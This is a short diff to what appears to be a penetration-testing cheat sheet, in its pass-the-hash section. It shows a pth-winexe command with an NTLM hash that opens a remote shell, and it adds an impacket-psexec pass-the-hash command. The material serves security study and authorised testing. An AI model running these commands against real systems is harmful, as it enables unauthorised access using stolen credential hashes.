@@ -304,6 +304,10 @@ https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
+-> Remote Access 
+```
+impacket-psexec '<hostname>/<user>'@<ip> -hashes ':<hash>'
+```
 
 #### Over Pass the Hash
 -> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
